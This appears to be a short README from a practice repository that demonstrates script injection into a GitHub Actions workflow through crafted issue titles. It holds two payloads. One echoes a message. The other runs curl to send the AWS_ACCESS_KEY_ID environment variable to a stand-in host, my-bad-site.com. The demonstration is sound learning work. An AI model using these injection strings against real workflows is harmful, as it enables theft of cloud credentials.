# Example Repo

This is a super simple example repository!

Experiments:

1. Script Injection
Creating a issue with title - a";echo Got your secrets"
" closes the double quotes in workflow line issue_title="${{ github.event.issue.title }}"
Title is just "a", rest is interpreted as sript -> echo Got your secrets
Outcome: 
In shell "echo Got your secrets" is printed

Creating a issue with title - a";curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY_ID"
curl can be used to send a http request to my-bad-site.com
query paramets abc could be set to the variable $AWS_ACCESS_KEY_ID
Outcome:
The env var AWS_ACCESS_KEY_ID is accessed and value is send to my-bad-site.com
Access key is exposed


